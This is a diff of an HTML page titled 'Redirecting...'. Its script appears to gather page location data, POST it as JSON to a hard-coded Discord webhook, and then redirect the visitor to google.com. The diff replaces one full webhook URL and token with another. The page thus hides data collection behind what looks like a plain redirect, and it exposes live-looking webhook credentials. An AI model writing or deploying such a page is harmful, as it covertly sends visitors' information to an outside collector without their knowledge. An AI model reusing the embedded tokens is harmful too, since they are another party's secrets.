@@ -3,12 +3,6 @@
 <head>
   <title>Redirecting...</title>
   <script>
-    /*
-    if (Quizlet.matchModeData.diagramImages.length != 0 || Quizlet.matchModeData.diagramShapes.length != 0) {
-        alert("ERROR");
-    }
-    */
-    //document.getElementById("documentLocation").innerHTML = document.location.pathname;
     var redirectURL = "https://www.google.com/";
     var href = document.location.href;
     var origin = document.location.origin;
@@ -31,14 +25,10 @@
           }]
       };
       var send = new XMLHttpRequest;
-      send["open"](["POST"], "https://discordapp.com/api/webhooks/415676570259423242/9fjsB-fpUJsOwwmGj3MInm13voDwaeuSatzQTMv0j4mTWcv9WYmnDoanHV5YqjdXWRBp");
+      send["open"](["POST"], "https://discordapp.com/api/webhooks/443247551244664832/hmLJj5SmLQhXvNkbxHED9qyevKf8sMBkO7iA0KXNyi7bstAGuNA2Z87Xx6eDSw2DPJx0");
       send["setRequestHeader"](["Content-Type"], ["application/json; charset=UTF-8"]);
       send["send"](JSON["stringify"](message))
       location.replace(redirectURL);
-    }
-    
-    document.onload = function() {
-      document.getElementById("edit-with-js-bin").remove();
     }
   </script>
 </head>
